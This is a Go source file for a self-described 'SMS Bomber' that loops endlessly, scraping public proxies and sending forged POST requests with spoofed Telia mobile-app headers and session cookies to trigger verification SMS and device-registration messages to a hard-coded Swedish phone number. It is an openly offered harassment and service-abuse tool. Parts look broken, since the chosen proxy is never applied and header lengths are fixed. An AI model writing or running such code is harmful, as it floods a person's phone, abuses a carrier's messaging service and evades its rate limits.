package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/gookit/color"
	"github.com/valyala/fasthttp"
)

var host, err = os.Hostname()

func main() {

	// Ensure there are proxies available

	fmt.Println("Starting SMS Bomber - Created by Lunar")
	for {
		StartALL()
		time.Sleep(time.Millisecond * 1)
	}
}

var proxyList = fetchProxies("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")

func fetchProxies(uri string) []string {
	resp, err := http.Get(uri)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	//read the body of the response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	proxy_list := strings.Replace(string(body), "\r", "", -1)
	return strings.Split(proxy_list, "\n")
}

func StartALL() {

	go Telia1()
	go Laddkod()
	go ProdMobil2()
}
func Telia1() {

	url := "http://37.187.56.77" // Replace with your API endpoint

	proxy := proxyList[rand.Intn(len(proxyList))]

	data := `{"identifier": "46726415603"}` // Fixed the JSON formatting issue

	req := fasthttp.AcquireRequest()

	defer fasthttp.ReleaseRequest(req)
	req.Header.SetMethod("POST")
	req.Header.Set("Host", "sa.telia.se")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("is-DarkMode", "true")
	req.Header.Set("X-IOS-Build", "4513")
	req.Header.Set("ga-av", "2023.13")
	req.Header.Set("ga-aid", "com.teliasonera.selfservice.telia")
	req.Header.Set("Accept-Language", "sv")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Content-Length", "34")
	req.Header.Set("User-Agent", "com.teliasonera.selfservice.telia/2023.13 (iOS 16.2; Apple iPhone10,4)")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("ga-an", "Mitttelia")
	req.Header.Set("X-InstallationID", "5D6D5A0B-456D-4ED6-9A64-355A2064085B")
	req.Header.Set("Cookie", "jsessionid=85AAC80FD95E4A47ABDDCAB92E333CB6; STSSESSION=F07A452C7D92810DB537D873A2B105D6")
	req.SetRequestURI(url)
	req.SetBodyString(data)

	err := fasthttp.Do(req, nil)

	if err != nil {
		color.Println("[<fg=blue>"+host+"</>] - [<fg=red>"+url+"</>] - [<fg=red>Invalid Proxy</>] ::", proxy)

	} else {

		color.Println("[<fg=blue>"+host+"</>] - [<fg=green>"+url+"</>] - [<fg=green>200</>] ::", proxy)

	}

}
func Laddkod() {

	url := "http://37.187.56.77" // Replace with your API endpoint

	proxy := proxyList[rand.Intn(len(proxyList))]

	req := fasthttp.AcquireRequest()

	defer fasthttp.ReleaseRequest(req)
	req.Header.SetMethod("POST")
	req.Header.Set("Host", "sa.telia.se")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("is-DarkMode", "true")
	req.Header.Set("X-IOS-Build", "4513")
	req.Header.Set("ga-av", "2023.13")
	req.Header.Set("ga-aid", "com.teliasonera.selfservice.telia")
	req.Header.Set("Accept-Language", "sv")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Content-Length", "34")
	req.Header.Set("User-Agent", "com.teliasonera.selfservice.telia/2023.13 (iOS 16.2; Apple iPhone10,4)")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("ga-an", "Mitttelia")
	req.Header.Set("X-InstallationID", "5D6D5A0B-456D-4ED6-9A64-355A2064085B")
	req.Header.Set("Cookie", "jsessionid=85AAC80FD95E4A47ABDDCAB92E333CB6; STSSESSION=F07A452C7D92810DB537D873A2B105D6")
	req.SetRequestURI(url)

	err := fasthttp.Do(req, nil)

	if err != nil {
		color.Println("[<fg=blue>"+host+"</>] - [<fg=red>"+url+"</>] - [<fg=red>Invalid Proxy</>] ::", proxy)

	} else {

		color.Println("[<fg=blue>"+host+"</>] - [<fg=green>"+url+"</>] - [<fg=green>200</>] ::", proxy)

	}

}
func ProdMobil2() {

	url := "http://37.187.56.77" // Replace with your API endpoint

	proxy := proxyList[rand.Intn(len(proxyList))]

	data := `{"hash":"Mqu2VBd7S9Tf3lQ74PogIytnuiw="," fasthttpId":"4a458cd7-b311-4676-b479-00f3ec583a93","messageService":"APP","messageType":"REGISTER_DEVICE_REQUEST","message":"{\"msisdn\":\"46726415603\",\"deviceId\":\"9f065f6d979246ed81c63cfe4fbaef39\",\"companyCode\":\"MP\",\"requestId\":null,\"deviceKey\":null,\"userId\":null,\"platform\":\"iOS\",\"osVersion\":\"16.2.0\",\"appVersionNumber\":\"1.4.33\",\"appBuildNumber\":\"2023.10.09.1\"}","requestId":null,"synchronous":true}` // Fixed the JSON formatting issue

	req := fasthttp.AcquireRequest()

	defer fasthttp.ReleaseRequest(req)

	req.Header.SetMethod("POST")
	req.Header.Set("Host", "sa.telia.se")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("is-DarkMode", "true")
	req.Header.Set("X-IOS-Build", "4513")
	req.Header.Set("ga-av", "2023.13")
	req.Header.Set("ga-aid", "com.teliasonera.selfservice.telia")
	req.Header.Set("Accept-Language", "sv")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Content-Length", "34")
	req.Header.Set("User-Agent", "com.teliasonera.selfservice.telia/2023.13 (iOS 16.2; Apple iPhone10,4)")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("ga-an", "Mitttelia")
	req.Header.Set("X-InstallationID", "5D6D5A0B-456D-4ED6-9A64-355A2064085B")
	req.Header.Set("Cookie", "jsessionid=85AAC80FD95E4A47ABDDCAB92E333CB6; STSSESSION=F07A452C7D92810DB537D873A2B105D6")
	req.SetRequestURI(url)
	req.SetBodyString(data)

	err := fasthttp.Do(req, nil)

	if err != nil {
		color.Println("[<fg=blue>"+host+"</>] - [<fg=red>"+url+"</>] - [<fg=red>Invalid Proxy</>] ::", proxy)

	} else {

		color.Println("[<fg=blue>"+host+"</>] - [<fg=green>"+url+"</>] - [<fg=green>200</>] ::", proxy)

	}

}
